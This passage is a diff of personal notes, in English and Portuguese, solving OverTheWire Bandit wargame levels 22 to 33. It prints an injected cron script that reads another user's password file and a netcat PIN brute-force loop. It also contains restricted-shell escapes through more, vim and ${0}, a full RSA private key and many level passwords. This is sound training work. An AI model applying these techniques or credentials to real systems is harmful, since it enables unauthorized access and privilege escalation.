+I simulate the results of that command to get the script's real target:
+
+#+begin_example
+bandit22@bandit:/etc/cron.d$ myname=bandit23; mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+bandit22@bandit:/etc/cron.d$ echo $mytarget
+8ca319486bfbbc3663ea0fbe81326349
+#+end_example
+
+Then I use that to ~cat~ the password from that target file:
+
+#+begin_example
+bandit22@bandit:/etc/cron.d$ cat /tmp/$mytarget
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+#+end_example
+
+Password obtained.
+
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+*** 23
+
+#+begin_example
+A program is running automatically at regular intervals from cron, the time-based job scheduler.
+Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script.
+This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+Commands you may need to solve this level
+
+chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+#+end_example
+
+I go straight to ~bandit24~'s script:
+
+#+begin_example
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+----------------------------------------------------------------------
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+#+end_example
+
+I analyze it piece by piece:
+
+#+begin_example
+myname=$(whoami)
+#+end_example
+
+Sets ~myname~ to ~bandit24~.
+
+#+begin_example
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        <<process each file>>
+    fi
+done
+#+end_example
+
+It processes each file in ~/var/spool/bandit24/foo~.
+I tried reading the contents of that directory, but got ~Permission denied.~
+
+The processing of each file occurs as follows:
+
+~<<process each file>> +≡~
+
+#+begin_src x :noweb-ref process each file
+echo "Handling $i"
+owner="$(stat --format "%U" ./$i)"
+if [ "${owner}" = "bandit23" ]; then
+    timeout -s 9 60 ./$i
+fi
+rm -f ./$i
+#+end_src
+
+It runs /my/ scripts inside ~/var/spool/bandit24/foo~.
+I will try to inject a script there that somehow gives me ~bandit24~'s password.
+
+#+begin_src shell
+#!/bin/bash
+MY_PASS_FILE=/etc/bandit_pass/bandit24
+TARGET=zoiaum
+
+cat ${MY_PASS_FILE} > ${TARGET}
+cp ${TARGET} /tmp
+#+end_src
+
+I created a file ~/tmp/zoinho.sh~, ~chmod +x~ it, and copied it to ~/var/spool/bandit24/foo~.
+Then after typing this, I went to check if I got the password.
+
+#+begin_example
+bandit23@bandit:/tmp$ cat zoiaum
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+#+end_example
+
+That file was created by ~bandit24~, and I was curious /why/ I have permission to /read/ it.
+I ran a ~stat~ on it:
+
+#+begin_example
+bandit23@bandit:/tmp$ stat zoiaum
+  File: zoiaum
+  Size: 33              Blocks: 8          IO Block: 4096   regular file
+Device: 259,1   Inode: 87017       Links: 1
+Access: (0664/-rw-rw-r--)  Uid: (11024/bandit24)   Gid: (11024/bandit24)
+Access: 2025-10-11 21:55:30.532352401 +0000
+Modify: 2025-10-11 21:55:01.567169570 +0000
+Change: 2025-10-11 21:55:01.567169570 +0000
+ Birth: 2025-10-11 21:55:01.565351402 +0000
+#+end_example
+
+I can see that, the file was created with read permission for everybody, and that is why I am allowed to read it.
+
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+*** 24
+
+#+begin_quote
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
+There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
+#+end_quote
+
+I try first to connect with ~nc~ to port 30002.
+
+#+begin_quote
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+#+end_quote
+
+Ok, separate password and pincode by a space.
+
+I go to the manpage for ideas on how to bruteforce it without creating new connections each time.
+
+#+begin_example
+nc localhost 30002 << EOF
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
+EOF
+#+end_example
+
+This works, but I would have to create a huge input string with all the possible combinations.
+Can I do it programatically?
+Back to the manpage.
+
+Couldn't find any way to build the combinations programatically without having to create a file.
+
+My first idea was to use ~yes~ to create copies of the password, then ~seq~ for the pin codes, then another command to concatenate them in columns, and pass it to ~nc~'s connection to port 30002.
+
+I could not find a command to concatenate the columns on Info coreutils.
+
+Then googling I stumbled upon ~COMMAND | while read LINE; do echo $LINE~.
+
+It works like this: ~COMMAND | while PREDICATE; BODY;~.
+The redirection with | gives COMMAND's output to ~while~.
+~while~ consumes that output one line per iteration.
+PREDICATE is evaluated once per iteration.
+In this case, it is the result of ~read LINE~.
+~read~ is programmed to assign the value of its input to the variable LINE.
+~read~ makes that line accessible via $LINE.
+Note that it could be any other name, instead of "LINE"---it is just a variable name.
+
+I saw that I could use this to concatenate the password with the pin codes with:
+
+#+begin_example
+seq -w 0 9999 | while read i; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002
+#+end_example
+
+I ran it in the server.
+
+#+begin_example
+bandit24@bandit:~$ seq -w 0 9999 | while read i; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002
+
+...
+
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+#+end_example
+
+I was curious to know the correct pin code.
+I redirected the output to a file, and counted the lines of that file, then tried guessing some pin codes in that neighborhood.
+I could have done some math :P
+
+#+begin_example
+seq -w 0 9999 | while read i; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002 > /tmp/tmp.kPTagzvdT7
+
+bandit24@bandit:~$ wc -l /tmp/tmp.kPTagzvdT7
+9166 /tmp/tmp.kPTagzvdT7
+
+bandit24@bandit:~$ head /tmp/tmp.kPTagzvdT7
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+b
+
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9164
+Wrong! Please enter the correct current password and pincode. Try again.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9163
+Wrong! Please enter the correct current password and pincode. Try again.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9162
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+#+end_example
+
+The pincode is 9162.
+
+iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+*** 25
+
+#+begin_quote
+Logging in to bandit26 from bandit25 should be fairly easy…
+The shell for user bandit26 is not /bin/bash, but something else.
+Find out what it is, how it works and how to break out of it.
+
+
+Commands you may need to solve this level
+
+ssh, cat, more, vi, ls, id, pwd
+#+end_quote
+
+There's a private key in bandit25's home dir:
+
+[[file:~/.ssh/id_rsa_overthewire.org-bandit26][s~/.ssh/id_rsa_overthewire.org-bandit26]] ≡
+
+#+begin_src ssh-key :tangle ~/.ssh/id_rsa_overthewire.org-bandit26
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+#+end_src
+
+#+begin_src shell
+chmod 600 ~/.ssh/id_rsa_overthewire.org-bandit26
+#+end_src
+
+After preparations above, used it to ~ssh~ as bandit26.
+
+It connects, but closes right away:
+
+#+begin_example
+  _                     _ _ _   ___   __  
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
+Connection to bandit.labs.overthewire.org closed.
+#+end_example
+
+I believe I must find out about what the shell for bandit26 is.
+
+~.bash_logout~ has some "privacy-increasing" measures...
+
+#+begin_example
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+#+end_example
+
+#+begin_example
+bandit25@bandit:/home/bandit26$ /usr/bin/clear_console 
+clear_console: terminal is not a console
+#+end_example
+
+Meh.
+
+I could find out bandit26's login shell by looking at the default place: ~/etc/passwd~.
+
+#+begin_example
+bandit25@bandit:~$ cat /etc/passwd|grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+#+end_example
+
+The contents of ~/usr/bin/showtext~ are:
+
+#+begin_example
+bandit25@bandit:~$ cat /usr/bin/showtext 
+----------------------------------------------------------------------
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+#+end_example
+
+Se eu peço para o ssh executar um comando ao final, tipo
+
+ssh {host port user id_rsa, etc} /bin/bash
+
+ele fica travado.
+
+Acho que é isso que o enunciado se refere quando diz
+
+#+begin_quote
+Find out what it is, how it works and how to break out of it.
+#+end_quote
+
+1. What it is
+   1. ~/usr/bin/showtext~
+2. How it works
+   1. It opens a text file, shows its content on the screen, and quits.
+      1. It uses ~exec~, and this means
+         1. This prevents access to the shell
+
+
+O ~exec~ roda o comando por cima do /usr/bin/showtext.
+
+O exec é um shell buit-in:
+
+#+begin_example
+(base) rafa@bach:~$ type -a exec
+exec is a shell builtin
+#+end_example
+
+#+begin_example
+(base) rafa@bach:~$ help exec
+exec: exec [-cl] [-a name] [command [argument ...]] [redirection ...]
+    Replace the shell with the given command.
+    
+    Execute COMMAND, replacing this shell with the specified program.
+    ARGUMENTS become the arguments to COMMAND.  If COMMAND is not specified,
+    any redirections take effect in the current shell.
+    
+    Options:
+      -a name   pass NAME as the zeroth argument to COMMAND
+      -c        execute COMMAND with an empty environment
+      -l        place a dash in the zeroth argument to COMMAND
+    
+    If the command cannot be executed, a non-interactive shell exits, unless
+    the shell option `execfail' is set.
+    
+    Exit Status:
+    Returns success unless COMMAND is not found or a redirection error occurs.
+(base) rafa@bach:~$ 
+#+end_example
+
+According to [[https://serverfault.com/a/823466][this answer on Server Fault]], all commands executed via ssh are actually executed by the login shell.
+This would mean
+
+ssh {connection stuff} ls
+
+ssh {...} /usr/bin/showtext ls.
+
+But /usr/bin/showtext does not deal with arguments in any way.
+So I don't see how this could help me.
+
+
+more accepts commands like vi
+
+in vi, they come via stderr
+
+
+this works for vi:
+
+https://vi.stackexchange.com/a/44475
+vim - <<< "Hello, World!" 2<<< ":w! file.txt | :q"
+
+É pra mandar um Ctrl+Z enquanto o ~more~ ainda tá rodando.
+Isso vai me dar o shell que o invocou.
+Short-lived program
+Difícil na mão.
+Usar um programa: expect.
+Precisa de um script.
+
+[[file:~/hack/overthewire.org/bandit26.expect][~/hack/overthewire.org/bandit26.expect]] ≡
+
+#+begin_src expect :tangle ~/hack/overthewire.org/bandit26.expect
+#!/usr/bin/expect -f
+# bandit26-hit.exp — spawn ssh and immediately send a control byte, then hand control to you.
+
+# === Configuration: change these to match your local SSH command ===
+set timeout 10
+set ssh_cmd {ssh -t -p 2220 -l bandit26 -i ~/.ssh/id_rsa_overthewire.org-bandit26 bandit.labs.overthewire.org}
+
+# === Control character to send ===
+# \032 is Ctrl+Z (ASCII SUB). Change to \003 for Ctrl+C, etc.
+set ctrl_byte "\003"
+
+# Spawn the SSH client
+spawn -noecho {*}$ssh_cmd
+
+# Option 1: wait for any data from the remote side, then immediately send the control char
+# (this triggers the key while the pager is running)
+expect {
+    -re {.+} { send -- $ctrl_byte }
+    timeout { send -- $ctrl_byte }   ;# fallback: send anyway if nothing seen within timeout
+}
+
+# Hand control to your terminal interactively
+interact
+#+end_src
+
+#+begin_src shell
+chmod +x bandit26.expect
+#+end_src
+
+#+RESULTS:
+
+
+
+janela pequena força modo interativo do more
+
+v abre o vim
+
+rodar ocmandos no vim
+
+rodei um open do pass if
+
+:e /etc/band.../band..26
+
+s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+
+Essa senha deixa logar, mas cai no mesmo problema.
+
+:set shell=/bin/bash
+
+:shell
+
+upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
+*** 27 -> 28
+
+git repo at
+
+ssh://bandit27-git@localhost/home/bandit27-git/repo
+via the port 2220
+
+i have to clone this repo
+
+**** clone logged in the server
+
+from the manpage, the format for ssh urls is
+
+#+begin_quote
+ssh://[user@]host.xz[:port]/~[user]/path/to/repo.git/
+#+end_quote
+
+translating to the address:
+
+git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
+
+didn't allow the clone (no write permission)
+
+going local
+
+**** clone from my local machine
+
+git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
+
+password was inside README
+
+Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
+*** 28 -> 29
+
+ssh://bandit28-git@localhost/home/bandit28-git/repo via the port 2220.
+
+git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
+
+tava no git log
+
+sshpass -p 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7 ssh bandit.labs.overthewire.org -p 2220 -l bandit29
+*** 29 -> 30
+:PROPERTIES:
+:header-args: :session *29*
+:END:
+
+**** Instructions
+
+#+begin_quote
+Level Goal
+
+There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220.
+The password for the user bandit29-git is the same as for the user bandit29.
+
+Clone the repository and find the password for the next level.
+Commands you may need to solve this level
+
+git
+#+end_quote
+
+**** Clone the repository
+
+Basic clone structure.
+
+#+begin_src shell
+export SERVER=bandit29-git@bandit.labs.overthewire.org
+export PORT=2220
+export REMOTE_FOLDER=/home/bandit29-git/repo
+export REMOTE_REPO=ssh://$SERVER:$PORT$REMOTE_FOLDER
+export LOCAL_FOLDER=$HOME/hack/overthewire.org/bandit29-git-repo
+export REPO=$LOCAL_FOLDER
+#+end_src
+
+Essential in this problem: mirror the remote repository.
+This way we get all the branches.
+The password turned out to be on a branch ~dev~, that was not fetched with the normal ~git clone~ command.
+
+#+begin_src shell
+export GIT_FLAGS="--mirror"
+echo git clone $GIT_FLAGS $REMOTE_REPO $REPO
+#+end_src
+
+#+RESULTS:
+: git clone --mirror ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo /home/rafa/hack/overthewire.org/bandit29-git-repo
+
+qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
+*** Bandit Level 30 → Level 31
+
+#+begin_quote
+Level Goal
+
+There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220.
+The password for the user bandit30-git is the same as for the user bandit30.
+
+Clone the repository and find the password for the next level.
+Commands you may need to solve this level
+
+git
+#+end_quote
+
+#+begin_src shell
+export BANDIT=bandit30-git
+export URL=${BANDIT}@bandit.labs.overthewire.org
+export PORT=2220
+export REMOTE_FOLDER=/home/${BANDIT}/repo
+export REMOTE_REPO=ssh://$URL:$PORT$REMOTE_FOLDER
+export LOCAL_FOLDER=$HOME/hack/overthewire.org/${BANDIT}-repo
+export REPO=$LOCAL_FOLDER
+export GIT_FLAGS="--mirror"
+echo git clone $GIT_FLAGS $REMOTE_REPO $REPO
+#+end_src
+
+#+RESULTS:
+: git clone --mirror ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo /home/rafa/hack/overthewire.org/bandit30-git-repo
+
+There was a ~secret~ tag.
+
+Fetched it.
+Couldn't ~checkout~ to it, nor hard reset to it.
+Then I looked inside it.
+
+#+begin_example
+(base) rafa@bach:~/hack/overthewire.org/bandit30-git-repo$ git cat-file -p secret
+fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
+#+end_example
+
+fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
+*** Bandit Level 31 → Level 32
+
+#+begin_quote
+Level Goal
+
+There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220.
+The password for the user bandit31-git is the same as for the user bandit31.
+
+Clone the repository and find the password for the next level.
+Commands you may need to solve this level
+
+git
+#+end_quote
+
+#+begin_src shell
+export BANDIT=bandit31-git
+export URL=${BANDIT}@bandit.labs.overthewire.org
+export PORT=2220
+export REMOTE_FOLDER=/home/${BANDIT}/repo
+export REMOTE_REPO=ssh://$URL:$PORT$REMOTE_FOLDER
+export LOCAL_FOLDER=$HOME/hack/overthewire.org/${BANDIT}-repo-mirror
+export REPO=$LOCAL_FOLDER
+export GIT_FLAGS="--mirror"
+echo git clone $GIT_FLAGS $REMOTE_REPO $REPO
+#+end_src
+
+#+RESULTS:
+: git clone --mirror ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo /home/rafa/hack/overthewire.org/bandit31-git-repo-mirror
+
+#+begin_src shell
+PASSWORD=fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
+URL=bandit.labs.overthewire.org
+PORT=2220
+BANDIT=bandit31
+echo sshpass -p ${PASSWORD} ssh $URL -p $PORT -l $BANDIT
+#+end_src
+
+#+RESULTS:
+: sshpass -p fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy ssh bandit.labs.overthewire.org -p 2220 -l bandit31
+
+**** Investigating bandit31's home folder
+
+#+begin_example
+bandit31@bandit:~$ ll
+total 24
+drwxr-xr-x   2 root root 4096 Aug 15 13:16 ./
+drwxr-xr-x 150 root root 4096 Aug 15 13:18 ../
+-rw-r--r--   1 root root  220 Mar 31  2024 .bash_logout
+-rw-r--r--   1 root root 3851 Aug 15 13:09 .bashrc
+-rwxr-xr-x   1 root root   59 Aug 15 13:16 .gitconfig*
+-rw-r--r--   1 root root  807 Mar 31  2024 .profile
+bandit31@bandit:~$ cat .gitconfig 
+[user]
+        email = bandit31@overthewire.org
+        name = bandit31
+#+end_example
+
+#+begin_src shell
+git ls-remote
+#+end_src
+
+#+begin_example
+(base) rafa@bach:~/hack/overthewire.org/bandit31-git-repo-mirror$ git ls-remote --heads --tags --refs --symref
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-1
+bandit31-git@bandit.labs.overthewire.org's password: 
+From ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
+508f78be4568c9cf050249a441800ad36c1fe5bd        refs/heads/master
+#+end_example
+
+**** I have to push a file to the remote repository
+
+#+begin_example
+2 files changed, 8 insertions(+)
+.gitignore | 1 +
+README.md  | 7 +++++++
+
+new file   .gitignore
+@@ -0,0 +1 @@
++*.txt
+new file   README.md
+@@ -0,0 +1,7 @@
++This time your task is to push a file to the remote repository.
++
++Details:
++    File name: key.txt
++    Content: 'May I come in?'
++    Branch: master
++
+#+end_example
+
+I want to
+1. Modify .gitignore and remove ~*.txt~
+
+
+Clone without mirror.
+
+#+begin_src shell
+export BANDIT=bandit31-git
+export URL=${BANDIT}@bandit.labs.overthewire.org
+export PORT=2220
+export REMOTE_FOLDER=/home/${BANDIT}/repo
+export REMOTE_REPO=ssh://$URL:$PORT$REMOTE_FOLDER
+export LOCAL_FOLDER=$HOME/hack/overthewire.org/${BANDIT}-repo
+export REPO=$LOCAL_FOLDER
+echo git clone $GIT_FLAGS $REMOTE_REPO $REPO
+#+end_src
+
+#+RESULTS:
+: git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo /home/rafa/hack/overthewire.org/bandit31-git-repo
+
+I need to add the user info I found on 31's home folder .gitconfig:
+Add it to the repo's .git/config file.
+
+#+begin_src gitconfig /home/rafa/hack/overthewire.org/bandit31-git-repo/.git/.gitconfig
+[user]
+        email = bandit31@overthewire.org
+        name = bandit31
+#+end_src
+
+#+begin_example
+  1 git … push -v origin master\:refs/heads/master
+Pushing to ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-1
+bandit31-git@bandit.labs.overthewire.org's password: 
+Writing objects: 100% (3/3), 301 bytes | 301.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: ### Attempting to validate files... ####        
+To ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
+ ! [remote rejected] master -> master (pre-receive hook declined)
+error: failed to push some refs to 'ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo'
+#+end_example
+
+>>>> ! [remote rejected] master -> master (pre-receive hook declined)
+
+What hook is that?
+Is it in the folder ~hooks~?
+Only sample hooks there.
+
+Is there something on the server?
+1. I looked
+
+
+fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
+
+#+begin_example
+  1 git … push -v origin master\:refs/heads/master
+Pushing to ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-1
+bandit31-git@bandit.labs.overthewire.org's password: 
+Writing objects: 100% (4/4), 361 bytes | 361.00 KiB/s, done.
+Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: ### Attempting to validate files... ####        
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.        
+remote: 
+remote: Well done! Here is the password for the next level:        
+remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K         
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.        
+remote: 
+To ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
+ ! [remote rejected] master -> master (pre-receive hook declined)
+error: failed to push some refs to 'ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo'
+#+end_example
+
+3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
+*** Bandit Level 32 → Level 33
+
+#+begin_quote
+Level Goal
+
+After all this git stuff, it’s time for another escape. Good luck!
+Commands you may need to solve this level
+
+sh, man
+#+end_quote
+
+#+begin_src shell
+PASSWORD=3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
+URL=bandit.labs.overthewire.org
+PORT=2220
+BANDIT=bandit32
+echo sshpass -p ${PASSWORD} ssh $URL -p $PORT -l $BANDIT
+#+end_src
+
+#+RESULTS:
+: sshpass -p 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K ssh bandit.labs.overthewire.org -p 2220 -l bandit32
+
+**** Control keys
+
+| Key | Result                   |
+|-----+--------------------------|
+| C-D | quit                     |
+| C-Z | no echo, but do not quit |
+|     |                          |
+
+#+begin_example
+
+>> a
+sh: 1: A: Permission denied
+>> \
+>> $
+sh: 1: $: Permission denied
+>> 
+>> !
+sh: 2: Syntax error: newline unexpected
+>> !
+sh: 2: Syntax error: newline unexpected
+>> " 
+sh: 2: Syntax error: Unterminated quoted string
+>> "bash"
+sh: 1: BASH: Permission denied
+
+#+end_example
+
+**** UPPERCASE SHELL: environment variables?
+
+**** The uppershell executable has setgid for bandit33
+
+#+begin_example
+bandit31@bandit:/home/bandit32$ ll
+total 36
+drwxr-xr-x   2 root     root      4096 Aug 15 13:16 ./
+drwxr-xr-x 150 root     root      4096 Aug 15 13:18 ../
+-rw-r--r--   1 root     root       220 Mar 31  2024 .bash_logout
+-rw-r--r--   1 root     root      3851 Aug 15 13:09 .bashrc
+-rw-r--r--   1 root     root       807 Mar 31  2024 .profile
+-rwsr-x---   1 bandit33 bandit32 15140 Aug 15 13:16 uppershell*
+               ^^^^^^^^
+#+end_example
+
+**** manpage sh: ${0} gives name of shell
+
+It was executing the expansions.
+It executed that, giving me an instance of ~sh~.
+
+#+begin_example
+WELCOME TO THE UPPERCASE SHELL
+>> ${$}
+sh: 1: 625083: Permission denied
+>> ${0}
+$ cat /etc/bandit_pass/bandit33
+tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
+#+end_example
+
+tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
+*** Bandit Level 33 → Level 34
+
+#+begin_quote
+At this moment, level 34 does not exist yet.
+#+end_quote
 
 * [2025-10-12 Sun]
 
